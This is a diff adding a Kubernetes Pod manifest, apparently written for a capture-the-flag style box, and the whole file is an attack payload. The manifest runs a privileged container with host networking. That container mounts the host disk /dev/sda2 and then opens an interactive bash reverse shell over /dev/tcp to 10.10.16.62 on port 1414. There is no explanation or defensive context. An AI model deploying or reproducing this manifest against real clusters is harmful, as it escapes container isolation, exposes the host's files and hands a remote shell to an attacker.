@@ -1,0 +1,15 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: wazapod
+spec:
+  containers:
+  - name: waza
+    image: localhost:5000/node_server
+    command: ["/bin/bash"]
+    args: ["-c", "mkdir /root_mount; mount /dev/sda2 /root_mount; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.62/1414 0>&1;'"]
+    securityContext:
+      privileged: true
+  hostNetwork: true
+
+  
